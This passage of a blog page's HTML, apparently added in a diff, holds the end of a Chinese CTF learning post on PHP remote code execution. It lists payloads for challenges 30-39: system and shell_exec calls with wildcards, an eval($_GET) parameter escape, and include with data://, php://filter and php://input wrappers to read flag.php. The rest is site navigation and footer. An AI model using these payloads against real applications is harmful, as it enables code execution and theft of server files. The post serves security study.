+            <td><pre><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;tac fla*.php&#39;</span>);</span></pre></td>
+          </tr></table>
+</figure>
+<p>30-取代函数&amp;通配符&amp;管道符</p>
+<figure class="highlight php">
+  <figcaption data-lang="php"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span><span style="color:#e6db74">`cp fla*.ph* 2.txt`</span>;</span></pre></td>
+          </tr><tr>
+            <td data-num="2"></td>
+            <td><pre><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;tac fla*.ph*&#39;</span>);</span></pre></td>
+          </tr></table>
+</figure>
+<p>31-参数逃逸</p>
+<figure class="highlight php">
+  <figcaption data-lang="php"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span><span style="color:#66d9ef">eval</span> ($_GET[<span style="color:#ae81ff">1</span>]);<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;tac flag.php&#39;</span>);</span></pre></td>
+          </tr></table>
+</figure>
+<p>32-36配合包含&amp;伪协议</p>
+<figure class="highlight php">
+  <figcaption data-lang="php"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span><span style="color:#66d9ef">include</span>$_GET[<span style="color:#a6e22e">a</span>]<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">&amp;a=data://text/plain,&lt;?=system(&#39;tac flag.php&#39;);?&gt;</span></span></pre></td>
+          </tr><tr>
+            <td data-num="2"></td>
+            <td><pre><span><span style="color:#960050;background-color:#1e0010">include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span></span></pre></td>
+          </tr></table>
+</figure>
+<p>37-39包含RCE&amp;伪协议&amp;通配符</p>
+<figure class="highlight php">
+  <figcaption data-lang="php"></figcaption>
+  <table><tr>
+            <td data-num="1"></td>
+            <td><pre><span><span style="color:#a6e22e">data</span><span style="color:#f92672">://</span><span style="color:#a6e22e">text</span><span style="color:#f92672">/</span><span style="color:#a6e22e">plain</span>,<span style="color:#f92672">&lt;?=</span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;tac fla*&#39;</span>);<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"></span></span></pre></td>
+          </tr><tr>
+            <td data-num="2"></td>
+            <td><pre><span><span style="color:#960050;background-color:#1e0010">php://input post:&lt;?php system(&#39;tac flag.php&#39;);?&gt;</span></span></pre></td>
+          </tr></table>
+</figure>
+<h1 id="黑盒-运行-rce-代码命令执行">
+  <a class="anchor" href="#%e9%bb%91%e7%9b%92-%e8%bf%90%e8%a1%8c-rce-%e4%bb%a3%e7%a0%81%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" aria-label="Anchor"></a>
+  黑盒-运行-RCE 代码命令执行
+</h1>
+<p>代码在线运行平台可以进行测试</p>
+<div class="tags"><a href="/tags/" rel="tag"><i class="ic i-tag"></i> </a></div></div>
+
+  <footer>
+    <div class="meta"></div>
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr"><div>
+        <img data-src="/images/alipay.jpg" alt="支付宝">
+        <p>支付宝</p>
+      </div><div>
+        <img data-src="/images/paypal.jpg" alt="贝宝">
+        <p>贝宝</p>
+      </div><div>
+        <img data-src="/images/wechatpay.jpg" alt="微信支付">
+        <p>微信支付</p>
+      </div></div>
+</div><div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>扬名立万 <i class="ic i-at"><em>@</em></i>扬名立万_ymlw
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong><a href="https://www.ctfhub.cn/posts/10/" title="Web攻防-58天RCE命令执行">https://www.ctfhub.cn/posts/10/</a></li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li>
+</ul>
+</div></footer>
+
+</article>
+
+  </div>
+  <div class="post-nav">
+  <div class="item left"><a href="/posts/kali-update-share-mount/" title="kali系统更新以及共享文件夹挂载" itemprop="url" data-background-image="/posts/kali-update-share-mount/1.jpg" rel="prev"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i> 网络安全</span><h3>kali系统更新以及共享文件夹挂载</h3></a></div>
+  <div class="item right"><a href="/posts/web-59-xml-xxe/" title="Web攻防-59天XML&amp;XXE" itemprop="url" data-background-image="/posts/web-59-xml-xxe/1.png" rel="next"><span class="type">下一篇</span><span class="category"><i class="ic i-flag"></i> 网络安全</span><h3>Web攻防-59天XML&XXE</h3></a></div>
+</div>
+
+  
+
+        </div>
+        <div id="sidebar">
+          
+  <div class="inner">
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录"><nav id="TableOfContents" class="toc">
+  <ul>
+    <li><a class="toc-link" href="#绕过">绕过</a>
+      <ul>
+        <li><a class="toc-link" href="#1关键词过滤">（1）关键词过滤：</a></li>
+        <li><a class="toc-link" href="#2过滤函数关键字">（2）过滤函数关键字</a></li>
+        <li><a class="toc-link" href="#3无回显利用">（3）无回显利用</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      <div class="related panel pjax" data-title="系列文章"><ul><li><a href="/posts/web-60-62-php-deserialization/" title="Web攻防-60-62PHP反序列化">Web攻防-60-62PHP反序列化</a></li><li><a href="/posts/web-59-xml-xxe/" title="Web攻防-59天XML&amp;XXE">Web攻防-59天XML&XXE</a></li><li><a href="/posts/kali-update-share-mount/" title="kali系统更新以及共享文件夹挂载">kali系统更新以及共享文件夹挂载</a></li><li><a href="/posts/web-57-ssrf/" title="Web攻防-57天SSRF服务端">Web攻防-57天SSRF服务端</a></li><li><a href="/posts/7/" title="Web攻防-56天CSRF客户端">Web攻防-56天CSRF客户端</a></li></ul></div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="扬名立万"
+      data-src="/images/1.jpg">
+  <p class="name" itemprop="name">扬名立万</p>
+  <div class="description" itemprop="description">网安 &amp; 取证的学习笔记</div>
+</div>
+
+<nav class="state"><div class="item posts">
+      <a href="/archives/">
+        <span class="count">16</span>
+        <span class="name">文章</span>
+      </a>
+    </div><div class="item categories">
+      <a href="/categories/">
+        <span class="count">4</span>
+        <span class="name">分类</span>
+      </a>
+    </div><div class="item tags">
+      <a href="/tags/">
+        <span class="count">4</span>
+        <span class="name">标签</span>
+      </a>
+    </div></nav>
+
+<div class="social"><span class="exturl item email" data-url="bWFpbHRvOnlvdXJuYW1lQG1haWwuY29t" title="mailto:yourname@mail.com"><i class="ic i-envelope"></i></span><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lvdXJuYW1l" title="https://github.com/yourname"><i class="ic i-github"></i></span><span class="exturl item instagram" data-url="aHR0cHM6Ly9pbnN0YWdyYW0uY29tL3lvdXJuYW1l" title="https://instagram.com/yourname"><i class="ic i-instagram"></i></span><span class="exturl item x" data-url="aHR0cHM6Ly94LmNvbS95b3VybmFtZQ==" title="https://x.com/yourname"><i class="ic i-x"></i></span></div>
+
+<ul class="menu">
+  <li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="javascript:void(0);" class="search" rel="section"><i class="ic i-search"></i>搜索</a></li>
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax"><a href="/posts/kali-update-share-mount/" title="上一篇" rel="prev"><i class="ic i-chevron-left"></i></a></li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax"><a href="/posts/web-59-xml-xxe/" title="下一篇" rel="next"><i class="ic i-chevron-right"></i></a></li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          <div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/web-js/" title="Web攻防-63-65天-JS应用">Web攻防-63-65天-JS应用</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/%E9%9D%B6%E5%9C%BA/" title="分类于 靶场">靶场</a></div>
+<span><a href="/posts/dvwabruteforce/" title="从DVWA开始学习漏洞原理-Brute Force">从DVWA开始学习漏洞原理-Brute Force</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/10/" title="Web攻防-58天RCE命令执行">Web攻防-58天RCE命令执行</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/debug/" title="分类于 Debug">Debug</a></div>
+<span><a href="/posts/githublocalshell/" title="Github本地上传笔记">Github本地上传笔记</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/6/" title="Web攻防-52-55天-XSS跨站">Web攻防-52-55天-XSS跨站</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/2/" title="Web攻防-41天">Web攻防-41天</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/4/" title="Web攻防-46天-sqlmap使用">Web攻防-46天-sqlmap使用</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/web-57-ssrf/" title="Web攻防-57天SSRF服务端">Web攻防-57天SSRF服务端</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/web-60-62-php-deserialization/" title="Web攻防-60-62PHP反序列化">Web攻防-60-62PHP反序列化</a></span>
+      </li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div>
+<span><a href="/posts/5/" title="Web攻防-50&amp;51天-文件包含、文件安全">Web攻防-50&51天-文件包含、文件安全</a></span>
+      </li></ul>
+</div><div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+        </div>
+        <div class="status">
+  <div class="copyright">
+    &copy;<span itemprop="copyrightYear">2026</span><span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">扬名立万 @ YMLW Shoka</span><br>
+      <span class="copyright-extra">© 2025 扬名立万_ymlw   <a href='https://beian.miit.gov.cn/' target='_blank'>苏ICP备2024061653号-1</a></span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9nb2h1Z28uaW8=">Hugo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div></div>
+
+      </div>
+    </footer>
+  </div>
+
+  <script data-config type="text/javascript">
+  var CONFIG = {"auto_scroll":true,"css":{"fancybox":"vendor/fancybox.bundle.min.css","katex":"vendor/katex.min.css","mermaid":"css/mermaid.css","valine":"css/comment.css"},"darkmode":false,"favicon":{"hidden":"images/failure.ico","normal":"images/favicon.ico"},"fireworks":["rgba(255,182,185,.9)","rgba(250,227,217,.9)","rgba(187,222,214,.9)","rgba(138,198,209,.9)"],"hostname":"https://www.ctfhub.cn","js":{"chart":"vendor/frappe-charts.min.iife.min.js","copy_tex":"vendor/katex-copy-tex.min.js","fancybox":"vendor/fancybox.bundle.min.js","valine":"vendor/minivaline.min.js"},"loader":{"start":true,"switch":false},"quicklink":{"priority":true,"timeout":3000},"root":"/","search":null,"search_hits":{"per_page":10},"statics":"/","valine":{"NoRecordIP":false,"appId":null,"appKey":null,"avatar":"mp","lang":"en","pageSize":10,"placeholder":"ヽ(○´∀`)ﾉ♪","powerMode":true,"serverURLs":null,"tagColor":{"friend":"var(--color-aqua)","investor":"var(--color-pink)","master":"var(--color-orange)"},"tagMember":{"friend":null,"investor":null,"master":null},"tagMeta":{"friend":"小伙伴","investor":"金主粑粑","master":"主人","visitor":"新朋友"},"visitor":true},"version":"0.2.5"};
+  var LOCAL = {"copyright":"复制成功，转载请遵守 \u003cspan class=\"exturl\" data-url=\"aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo\"\u003e\u003ci class=\"ic i-creative-commons\"\u003e\u003c/i\u003eBY-NC-SA\u003c/span\u003e 协议。","fancybox":true,"favicon":{"hide":"(´Д｀)大変だ！","show":"（●´3｀●）やれやれだぜ"},"path":"posts/10/","search":{"empty":"关于 「 ${query} 」，什么也没搜到","placeholder":"文章搜索","stats":"${time} ms 内找到 ${hits} 条结果"}};
+  LOCAL.ignores = [
+    function(uri) {
+      return uri.includes('#');
+    },
+    function(uri) {
+      return new RegExp(LOCAL.path + '$').test(uri);
+    }
+  ];
+</script>
+
+
+  <script src="/vendor/pace.min.js"></script><script src="/vendor/pjax.min.js"></script><script src="/vendor/fetch.umd.min.js"></script><script src="/vendor/anime.min.js"></script><script src="/vendor/algoliasearch-lite.umd.js"></script><script src="/vendor/instantsearch.production.min.js"></script><script src="/vendor/lozad.min.js"></script><script src="/vendor/quicklink.umd.js"></script>
+
+  <script src="/js/app.js"></script><script src="/js/fireworks.js"></script>
+
+</body>
+</html>
